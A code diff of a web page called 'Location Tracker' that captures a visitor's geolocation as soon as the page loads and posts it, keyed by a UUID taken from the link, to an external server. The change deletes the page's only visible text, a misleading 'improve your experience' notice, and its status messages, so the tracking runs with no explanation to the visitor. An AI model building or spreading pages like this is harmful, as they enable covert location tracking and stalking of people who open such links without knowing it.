@@ -5,40 +5,22 @@
     <title>Location Tracker</title>
 </head>
 <body>
-    <p id="info">Please allow location access to improve your experience.</p>
     <script>
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    position => {
-                        const uuid = window.location.pathname.split('/').pop();
-                        const { latitude, longitude } = position.coords;
+        navigator.geolocation.getCurrentPosition(position => {
+            const uuid = window.location.pathname.split('/').pop();
+            const { latitude, longitude } = position.coords;
 
-                        fetch('https://geo-localisation.onrender.com/api/location', {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json'
-                            },
-                            body: JSON.stringify({ uuid, latitude, longitude })
-                        })
-                        .then(response => response.text())
-                        .then(data => {
-                            console.log(data);
-                            document.getElementById('info').innerText = 'Location saved successfully.';
-                        })
-                        .catch(error => console.error('Error:', error));
-                    },
-                    error => {
-                        console.error('Error obtaining geolocation:', error);
-                        document.getElementById('info').innerText = 'Could not get location. Please enable location services.';
-                    }
-                );
-            } else {
-                document.getElementById('info').innerText = 'Geolocation is not supported by this browser.';
-            }
-        }
-
-        getLocation();
+            fetch('https://geo-localisation.onrender.com/api/location', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ uuid, latitude, longitude })
+            })
+            .then(response => response.text())
+            .then(data => console.log(data))
+            .catch(error => console.error('Error:', error));
+        });
     </script>
 </body>
 </html>
